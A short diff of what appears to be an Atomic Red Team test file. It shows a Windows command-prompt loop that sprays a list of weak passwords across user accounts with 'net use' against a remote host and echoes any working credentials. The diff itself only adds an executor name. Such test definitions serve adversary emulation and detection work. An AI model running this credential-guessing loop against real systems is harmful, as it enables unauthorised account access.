@@ -31,3 +31,4 @@ atomic_tests:
       echo "1q2w3e4r" >> #{input_file_passwords}
       echo "Password!" >> #{input_file_passwords}
       @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+    name: command_prompt
